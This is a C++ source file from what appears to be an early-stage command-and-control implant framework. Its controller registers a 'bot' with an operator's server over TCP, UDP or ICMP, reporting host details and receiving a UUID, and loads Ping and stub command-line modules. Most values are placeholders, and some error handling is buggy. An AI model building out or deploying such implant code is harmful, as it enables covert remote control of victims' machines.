#include "logic_controller.hpp"

namespace hivemind_lib {
logic_controller::logic_controller() {
  this->transportMethod = None;
}

int logic_controller::RegisterBot() {
  struct RegistrationRequest registration_request;
  struct Packet packet;
  this->implantInfo = {"", "192.168.7.1"};

  std::vector<ModuleInfo> values;

  for (const auto &kv : this->modules) {
    values.push_back(kv.second->modInfo);
  }

  // TODO Get this stuff
  registration_request.hostname = "Meep";
  registration_request.MAC = "aa:ss:dd:ff:gg:hh";
  registration_request.implantVersion = "asdf";
  registration_request.IP = this->implantInfo.primaryIP;
  registration_request.implantName = "Battle Paddle";
  registration_request.OS = "Windows trash";
  registration_request.supportedModules = values;
  //******************

  nlohmann::json j = nlohmann::json(registration_request);

  // TODO determine fingerprint
  packet.fingerprint = "fingerprint";
  packet.implantInfo = this->implantInfo;
  packet.numLeft = 0;
  packet.packetType = RegistrationRequestCode;
  packet.data = j.dump();

  nlohmann::json p = nlohmann::json(packet);

  auto response = this->transport->SendAndReceive(p.dump());
  DEBUG(response, LEVEL_ERROR);
  try {
    nlohmann::json resp = nlohmann::json::parse(response);
    auto packetResp = resp.get<Packet>();

    if (packetResp.packetType == RegistrationResponseCode) {
      DEBUG("Packet type received: " << packetResp.packetType, LEVEL_DEBUG);
      auto innerData = nlohmann::json::parse(packetResp.data);
      auto regResp = innerData.get<RegistrationResponse>();
      this->implantInfo.UUID = regResp.UUID;
    } else if (packet.packetType == ErrorCode) {
      DEBUG("Packet type received: " << packetResp.packetType, LEVEL_DEBUG);
      auto innerData = nlohmann::json::parse(packetResp.data);
      auto regError = innerData.get<Error>();
      DEBUG("Error with registration: " << regError.errorNum, LEVEL_ERROR);
      return regError.errorNum;
    } else {
      DEBUG("Unexpected packet type: " << packetResp.packetType, LEVEL_ERROR);
      return ErrorCode;
    }
  } catch (...) {
    DEBUG("Error thrown in registration", LEVEL_ERROR);
  }
  return 0;
}

//TODO Implement this.
void logic_controller::BeginComms() {
  auto f = this->modules["PING"]->funcMap["PING"]("8.8.8.8");
}

void logic_controller::AddModule(ModuleEnum mod) {
  switch (mod) {
    case All: {
      DEBUG("Adding All Modules", LEVEL_DEBUG);
    }
    case Ping: {
      DEBUG("Adding Ping Module", LEVEL_DEBUG);
      std::unique_ptr<Module> ping = std::make_unique<Ping_Module>();
      auto info = ping->init();
      this->modules.insert({ping->modInfo.moduleName, std::move(ping)});
      if (mod != All) break;
    }
    case CommandLine: {
      DEBUG("Adding Command Line Module", LEVEL_DEBUG);
      break;
    }
    default: {
      DEBUG("UNKNOWN MODULE", LEVEL_ERROR);
    }
  }
}

void logic_controller::SetTransportMethod(Transport_Enum transport_enum) {
  this->transportMethod = transport_enum;
}

void logic_controller::InitComms(std::string hostname, std::string port) {
  switch (this->transportMethod) {
    case TCP:this->transport = std::make_unique<Tcp_Transport>(std::move(hostname), std::move(port));
      break;
    case UDP:this->transport = std::make_unique<Udp_Transport>(std::move(hostname), std::move(port));
      break;
    case ICMP:this->transport = std::make_unique<Icmp_Transport>(std::move(hostname), std::move(port));
      break;
    case None:DEBUG("No transport method chosen", LEVEL_ERROR);
      break;
  }
}
void logic_controller::AddFunction(std::function<std::string(std::string)> func) {

}
}